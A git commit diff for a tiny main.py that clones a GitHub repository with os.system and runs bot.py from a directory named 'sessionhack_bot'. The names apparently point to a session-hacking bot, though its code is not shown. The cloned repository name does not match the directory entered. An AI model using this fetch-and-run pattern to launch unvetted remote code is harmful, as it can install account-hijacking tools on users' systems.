a62a7df349de3b2325e8e4fe06cc568155adbd08
Aleyivdiiiiiii <100187817+Aleyivdiiiiiii@users.noreply.github.com>
2022-03-07 03:07:10 +0400

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,3 @@
 import os
-os.system("git clone https://github.com/Aleyivdiiiiiii/baaww88629")
+os.system("git clone https://github.com/Aleyivdiiiiiii/Icraat_hackrobot")
 os.system("cd sessionhack_bot && python bot.py")
